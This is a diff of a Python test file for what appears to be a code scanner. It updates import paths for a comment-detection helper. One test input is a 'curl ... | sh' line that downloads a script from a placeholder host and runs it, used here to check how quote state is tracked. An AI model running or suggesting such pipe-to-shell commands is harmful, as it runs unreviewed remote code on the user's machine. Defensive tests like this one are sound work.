@@ -2813,14 +2813,14 @@ class TestAnElephantInACommentIsNotAnElephant:
         ],
     )
     def test_the_predicate(self, line: str, column: int, language, commented: bool) -> None:
-        from cordon_scanner.foundation.comments import SourceComments
+        from cordon_scanner.foundation.text.comments import SourceComments
 
         assert SourceComments.is_commented(line, column, language) is commented
 
     def test_a_quoted_hash_is_not_a_comment(self) -> None:
         """The case that makes this worth tracking quote state for. A fragment in a URL
         is not a comment, and the pipe after it is not commented out."""
-        from cordon_scanner.foundation.comments import SourceComments
+        from cordon_scanner.foundation.text.comments import SourceComments
 
         line = 'curl "https://x.test/p#frag" | sh'
         assert not SourceComments.is_commented(line, line.index("| sh"), "shell")
